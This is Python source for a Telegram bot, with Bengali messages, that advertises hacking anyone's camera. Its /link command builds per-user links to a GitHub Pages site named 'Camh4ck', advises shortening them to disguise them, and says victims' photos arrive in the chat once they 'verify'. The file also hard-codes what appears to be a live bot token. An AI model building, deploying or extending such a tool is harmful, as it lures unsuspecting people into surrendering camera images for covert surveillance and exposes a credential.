import telebot
from telebot import types
import time

# আপনার টোকেন
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার GitHub পেজের লিঙ্ক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('/start'), types.KeyboardButton('/link'))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        f"হ্যালো {message.from_user.first_name}!\n"
        "Welcome to 50/50 bot\n"
        "এর সাহায্যে আপনি যে কারো ক্যামেরা হ্যাক (Hack) করতে পারবেন।\n\n"
        "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
        "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

@bot.message_handler(commands=['link'])
def send_link(message):
    personal_link = f"{BASE_URL}?id={message.chat.id}"
    response_text = (
        "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
        f"🔗 ক্যামেরা অ্যাক্সেস লিঙ্ক: {personal_link}\n\n"
        "লিঙ্কটি ছোট করুন:\nhttps://lc.cx/en\n\n"
        "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
    )
    bot.send_message(message.chat.id, response_text, reply_markup=main_keyboard())

if __name__ == "__main__":
    while True:
        try:
            bot.remove_webhook()
            print("বোটটি সচল আছে...")
            # কানেকশন এরর এড়াতে টাইমআউট বাড়ানো হয়েছে
            bot.infinity_polling(none_stop=True, timeout=90, long_polling_timeout=20)
        except Exception as e:
            print(f"Connection Error: {e}. ১০ সেকেন্ড পর আবার চেষ্টা করা হচ্ছে...")
            time.sleep(10)
